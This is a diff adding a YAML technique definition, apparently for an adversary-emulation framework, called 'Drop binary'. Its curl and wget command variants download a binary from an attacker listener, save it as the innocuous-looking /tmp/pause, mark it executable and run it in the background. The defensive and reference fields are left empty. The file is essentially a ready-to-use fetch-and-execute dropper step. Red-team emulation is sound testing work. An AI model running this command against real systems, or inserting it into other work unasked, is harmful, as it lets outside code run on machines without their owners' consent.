@@ -1,0 +1,28 @@
+name: Drop binary
+description: Downloads a binary from the provided source to a system
+tactic: Execution
+techniques: ["User Execution"]
+parameters:
+  URL:
+    type: string
+    description: the url from where to download the binary
+  SRC_BIN:
+    type: string
+    description: the name of the binary on the fileshare
+  DST_BIN:
+    type: string
+    description: the destination path of the binary at the remote system
+    required: false
+args:
+  URL: "${LISTENER}/${FILESHARE_PORT}"
+  DST_BIN: "/tmp/pause"
+cmdVariants:
+  - key: curl
+    command: curl -L ${URL} -o ${DST_BIN}  && chmod +x ${DST_BIN} && ${DST_BIN} &
+  - key: wget
+    command: wget ${URL} -O ${DST_BIN} && chmod +x ${DST_BIN} && ${DST_BIN} &
+preconditions:
+  accessLevel: "user-exec"
+# cmd: {}
+# defend: {}
+# refernces:
